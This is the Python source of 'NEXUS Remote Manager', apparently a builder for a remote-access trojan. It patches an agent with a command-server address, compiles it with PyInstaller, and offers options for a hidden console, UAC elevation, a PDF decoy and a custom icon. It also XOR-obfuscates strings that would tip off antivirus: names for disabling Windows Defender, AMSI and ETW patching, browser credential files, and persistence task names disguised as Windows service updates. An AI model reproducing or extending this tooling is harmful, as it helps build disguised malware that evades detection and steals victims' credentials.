#!/usr/bin/env python3
"""
NEXUS Remote Manager — Configure, build, and manage agents.
"""

import os, sys, platform, subprocess, threading, time, socket, shutil, argparse, json, re, base64
from pathlib import Path

CONFIG_FILE = "manager_config.json"

DEFAULTS = {
    "server_ip": "127.0.0.1",
    "server_port": "8080",
    "output_name": "agent",
    "console": False,
    "uac_admin": False,
    "icon": "",
    "upx": False,
    "onefile": True,
    "use_pdf": False,
    "pdf_path": "",
    "stealth": True,
}

# XOR key must match the one in client.py
_OBF_KEY = b"\x9e\xa3\x7c\xd1\x45\x08\xfb\x9a\x62\x3e\xc0\x77\x1a\xe4\x5b\x8f"

SPEC_TEMPLATE = """# -*- mode: python ; coding: utf-8 -*-
a = Analysis(
    ['{client_file}'],
    pathex=[],
    binaries=[],
    datas={datas},
    hiddenimports=[],
    hookspath=[],
    hooksconfig={{}},
    runtime_hooks=[],
    excludes=[],
    noarchive=False,
    optimize=0,
)
pyz = PYZ(a.pure)
exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.datas,
    [],
    name='{output_name}',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx={upx},
    upx_exclude=[],
    runtime_tmpdir=None,
    console={console},
    onefile={onefile},
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    {uac_line}
    {icon_line}
)
"""


def get_local_ips():
    ips = ["0.0.0.0", "127.0.0.1"]
    try:
        for info in socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET):
            ip = info[4][0]
            if ip not in ips:
                ips.append(ip)
    except:
        pass
    return ips


class Manager:
    def __init__(self):
        self.config = dict(DEFAULTS)
        self.load_config()

    def load_config(self):
        p = Path(CONFIG_FILE)
        if p.exists():
            try:
                with open(p) as f:
                    self.config.update(json.load(f))
            except:
                pass

    def save_config(self):
        with open(CONFIG_FILE, "w") as f:
            json.dump(self.config, f, indent=2)
        print("  [+] Config saved")

    def patch_client(self):
        src = Path("client.py").read_text(encoding="utf-8")
        src = re.sub(
            r'SERVER_IP = os\.environ\.get\("SERVER_IP", "[^"]*"\)',
            f'SERVER_IP = os.environ.get("SERVER_IP", "{self.config["server_ip"]}")',
            src,
        )
        src = re.sub(
            r'SERVER_PORT = int\(os\.environ\.get\("SERVER_PORT", os\.environ\.get\("PORT", "[^"]*"\)\)\)',
            f'SERVER_PORT = int(os.environ.get("SERVER_PORT", os.environ.get("PORT", "{self.config["server_port"]}")))',
            src,
        )
        Path("client.py").write_text(src, encoding="utf-8")
        print(f"  [+] Patched client.py -> {self.config['server_ip']}:{self.config['server_port']}")

    def generate_spec(self):
        datas = []
        if self.config.get("use_pdf") and self.config.get("pdf_path"):
            pdf = self.config["pdf_path"]
            if os.path.exists(pdf):
                sep = ";" if platform.system() == "Windows" else ":"
                datas.append(f"{pdf}{sep}.")
        datas_str = json.dumps(datas)

        uac_line = ""
        if self.config["uac_admin"]:
            uac_line = "uac_admin=True,"
        icon_line = ""
        if self.config["icon"] and os.path.exists(self.config["icon"]):
            icon_line = f"icon=[r'{self.config['icon']}'],"

        spec = SPEC_TEMPLATE.format(
            client_file="client.py",
            output_name=self.config["output_name"],
            datas=datas_str,
            upx=str(self.config["upx"]),
            console=str(self.config["console"]),
            onefile=str(self.config["onefile"]),
            uac_line=uac_line,
            icon_line=icon_line,
        )
        spec_file = f"build_{self.config['output_name']}.spec"
        Path(spec_file).write_text(spec)
        print(f"  [+] Generated {spec_file}")
        return spec_file

    def _xobf(self, s):
        k = _OBF_KEY
        raw = bytes(ord(c) ^ k[i % len(k)] ^ (i & 0xFF) for i, c in enumerate(s))
        return base64.b64encode(raw).decode()

    _TRIGGER_STRINGS = [
        "WinDefend", "Sense", "WdBoot", "WdFilter", "WdNisSvc", "WinSvcUpdate",
        "WindowsServiceUpdater", "DisableAntiSpyware", "DisableRealtimeMonitoring",
        "DisableBehaviorMonitoring", "DisableBlockAtFirstSeen", "DisableIOAVProtection",
        "DisablePrivacyMode", "DisableArchiveScanning", "DisableIntrusionPreventionSystem",
        "DisableScriptScanning", "SignatureDisableUpdateOnStartupWithoutEngine",
        "SubmitSamplesConsent", "AmsiScanBuffer", "EtwEventWrite", "VirtualProtect",
        "MpPreference", "Add-MpPreference", "Set-MpPreference", "WinDefend",
        "Global\\WinSvcUpdate", "Login Data", "Local State", "os_crypt", "encrypted_key",
        "WinSvcUpdateLogon", "WinSvcUpdatePeriodic", "WinSvcUpdateStartup",
        "WinSvcUpdateIdle", "Windows Service Update Manager",
    ]

    def _obfuscate_client(self):
        backup = Path("client.py.bak")
        orig = Path("client.py")
        if backup.exists():
            orig.write_text(backup.read_text("utf-8"), "utf-8")
        else:
            backup.write_text(orig.read_text("utf-8"), "utf-8")

        if not self.config.get("stealth"):
            return

        src = orig.read_text("utf-8")
        changed = 0
        for plain in self._TRIGGER_STRINGS:
            obf = self._xobf(plain)
            count = src.count(f'"{plain}"')
            if count:
                src = src.replace(f'"{plain}"', f'_s("{obf}")')
                changed += count
        if changed:
            orig.write_text(src, "utf-8")
            print(f"  [+] Obfuscated {changed} trigger strings in client.py")
        else:
            print("  [-] No trigger strings to obfuscate (already done?)")

    def _find_pyinstaller(self):
        candidates = ["pyinstaller", "pyinstaller3"]
        for c in candidates:
            if shutil.which(c):
                return [c]
        try:
            subprocess.run(
                [sys.executable, "-m", "PyInstaller", "--version"],
                capture_output=True, timeout=10,
            )
            return [sys.executable, "-m", "PyInstaller"]
        except:
            return None

    def build_agent(self):
        print("\n--- Building Standalone Agent ---")
        self._obfuscate_client()
        self.patch_client()
        spec = self.generate_spec()

        pyinst = self._find_pyinstaller()
        if not pyinst:
            print("  [X] PyInstaller not installed. Run: pip install pyinstaller")
            return

        print(f"  Running PyInstaller...")
        cmd = pyinst + ["--noconfirm", spec]

        result = subprocess.run(cmd, capture_output=True, timeout=600)
        if result.returncode == 0:
            ext = ".exe" if platform.system() == "Windows" else ""
            exe_path = os.path.join("dist", self.config["output_name"] + ext)
            if os.path.exists(exe_path):
                size = os.path.getsize(exe_path) / 1024 / 1024
                print(f"  [+] Build OK -> {exe_path} ({size:.1f} MB)")
            else:
                print("  [!] Build OK but exe not found in dist/")
        else:
            print("  [X] Build failed:")
            print(result.stderr.decode()[-1500:])

    def start_server(self):
        print("\n--- Starting Server ---")
        ip = self.config["server_ip"]
        port = self.config["server_port"]
        self._kill_port(port)
        env = {**os.environ, "HOST": ip, "PORT": str(port)}
        p = subprocess.Popen(
            [sys.executable, "server.py"], env=env,
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
        )
        time.sleep(2)
        if p.poll() is None:
            print(f"  [+] Server running on http://{ip}:{port}")
        else:
            _, err = p.communicate()
            print(f"  [X] Failed: {err.strip()[:500]}")

    def stop_server(self):
        print("\n--- Stopping Server ---")
        self._kill_port(self.config["server_port"])
        print("  [+] Done")

    def _kill_port(self, port):
        try:
            if platform.system() == "Windows":
                out = subprocess.check_output(
                    f'netstat -ano | findstr :{port} | findstr LISTEN',
                    shell=True, text=True,
                )
                for line in out.strip().split("\n"):
                    parts = line.split()
                    if parts and parts[-1].isdigit():
                        subprocess.run(["taskkill", "/F", "/PID", parts[-1], "/T"],
                                       capture_output=True)
            else:
                try:
                    out = subprocess.check_output(["lsof", "-ti", f":{port}"], text=True)
                    for pid in out.strip().split("\n"):
                        if pid:
                            subprocess.run(["kill", "-9", pid])
                except:
                    pass
        except:
            pass

    def show_menu(self):
        os.system("cls" if os.name == "nt" else "clear")
        c = self.config
        print("=== NEXUS Remote Manager ===\n")
        items = [
            ("1", "Server IP", c["server_ip"]),
            ("2", "Server Port", c["server_port"]),
            ("3", "Output exe name", c["output_name"]),
            ("4", "Console window", "Yes" if c["console"] else "No"),
            ("5", "UAC Admin", "Yes" if c["uac_admin"] else "No"),
            ("6", "Icon file", c["icon"] or "(none)"),
            ("7", "UPX compress", "Yes" if c["upx"] else "No"),
            ("8", "Single file", "Yes" if c["onefile"] else "No"),
            ("9", "PDF decoy", "Yes" if c["use_pdf"] else "No"),
            ("0", "Stealth obfuscation", "Yes" if c["stealth"] else "No"),
        ]
        for k, label, val in items:
            print(f"  [{k}] {label:17s} {val}")
        print(f"\n  [S] Start server    [T] Stop server")
        print(f"  [B] BUILD agent     [C] Show config")
        print(f"  [Q] Quit")
        return input("\n  Choice: ").strip().lower()

    def edit(self, prompt, current=""):
        v = input(f"  {prompt} [{current}]: ").strip()
        return v if v else current

    def run(self):
        while True:
            ch = self.show_menu()
            c = self.config
            if ch == "1":
                c["server_ip"] = self.edit("Server IP", c["server_ip"])
            elif ch == "2":
                c["server_port"] = self.edit("Port", c["server_port"])
            elif ch == "3":
                c["output_name"] = self.edit("Output name", c["output_name"])
            elif ch == "4":
                c["console"] = not c["console"]
            elif ch == "5":
                c["uac_admin"] = not c["uac_admin"]
            elif ch == "6":
                v = input(f"  Icon path [{c['icon'] or 'none'}]: ").strip()
                if v:
                    if os.path.exists(v):
                        c["icon"] = v
                    else:
                        print("  [!] File not found")
                else:
                    c["icon"] = ""
            elif ch == "7":
                c["upx"] = not c["upx"]
            elif ch == "8":
                c["onefile"] = not c["onefile"]
            elif ch == "9":
                c["use_pdf"] = not c["use_pdf"]
                if c["use_pdf"]:
                    v = input(f"  PDF path [{c['pdf_path'] or 'none'}]: ").strip()
                    if v:
                        if os.path.exists(v):
                            c["pdf_path"] = v
                        else:
                            print("  [!] File not found")
                    elif not c["pdf_path"]:
                        c["use_pdf"] = False
            elif ch == "0":
                c["stealth"] = not c["stealth"]
            elif ch == "s":
                self.save_config()
                self.start_server()
                input("\n  Press Enter...")
            elif ch == "t":
                self.stop_server()
                input("\n  Press Enter...")
            elif ch == "b":
                self.save_config()
                self.build_agent()
                input("\n  Press Enter...")
            elif ch == "c":
                print("\n--- Config ---")
                for k, v in c.items():
                    print(f"  {k}: {v}")
                input("\n  Press Enter...")
            elif ch == "q":
                self.save_config()
                print("Bye")
                break


def main():
    parser = argparse.ArgumentParser(description="NEXUS Remote Manager")
    parser.add_argument("--build", metavar="IP:PORT", help="Build agent for IP:PORT and exit")
    parser.add_argument("--name", default="agent", help="Output exe name (with --build)")
    parser.add_argument("--console", action="store_true", help="Show console window")
    parser.add_argument("--uac", action="store_true", help="Request UAC admin")
    parser.add_argument("--icon", help="Icon .ico file")
    parser.add_argument("--stealth", action="store_true", help="Enable string obfuscation")
    parser.add_argument("--no-stealth", action="store_true", help="Disable string obfuscation")
    args = parser.parse_args()

    m = Manager()
    if args.no_stealth:
        m.config["stealth"] = False
    if args.stealth:
        m.config["stealth"] = True
    if args.build:
        if ":" in args.build:
            ip, port = args.build.split(":", 1)
            m.config["server_ip"] = ip
            m.config["server_port"] = port
        else:
            m.config["server_ip"] = args.build
        m.config["output_name"] = args.name
        m.config["console"] = args.console
        m.config["uac_admin"] = args.uac
        if args.icon:
            m.config["icon"] = args.icon
        m.build_agent()
    else:
        m.run()


if __name__ == "__main__":
    main()
